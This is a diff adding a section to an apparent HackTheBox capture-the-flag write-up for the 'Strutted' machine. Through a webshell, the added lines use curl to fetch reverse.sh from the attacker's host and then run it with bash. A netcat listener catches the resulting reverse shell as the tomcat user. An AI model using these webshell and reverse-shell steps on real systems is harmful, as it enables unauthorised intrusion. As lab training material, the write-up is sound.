@@ -276,6 +276,44 @@ Once uploaded, we try to `run` a `whoami`:
 
 <br />
 
-Perfect!! We can `execute` commands in the system, let's gain `access` with a `Reverse Shell`:
+Perfect!! We can `execute` commands in the system, let's gain `access` with a `Reverse Shell`.
+
+To do it, firt we create a "reverse.sh" file and put it in the /tmp path of the victim system with curl:
+
+-> `http://strutted.htb/webshell.jsp?action=cmd&cmd=curl%2010.10.14.22/reverse.sh%20-o%20/tmp/reverse.sh`
+
+<br />
+
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.59 - - [08/Mar/2025 17:59:24] "GET /reverse.sh HTTP/1.1" 200 -
+
+<br />
+
+Now we can `execute` the `script` with the following `command`:
+
+-> `http://strutted.htb/webshell.jsp?action=cmd&cmd=bash%20/tmp/reverse.sh`
+
+<br />
+
+```bash
+❯ sudo nc -nlvp 443
+[sudo] contraseña para theredp4nther: 
+listening on [any] 443 ...
+connect to [10.10.14.22] from (UNKNOWN) [10.10.11.59] 46340
+bash: cannot set terminal process group (1034): Inappropriate ioctl for device
+bash: no job control in this shell
+tomcat@strutted:~$ id
+id
+uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)
+```
+
+<br />
+
+Intrusion ready!! Let's go with the Privilege Escalation!!
+
+<br />
+
+# Privilege Escalation: tomcat -> thomas
 
 <br />
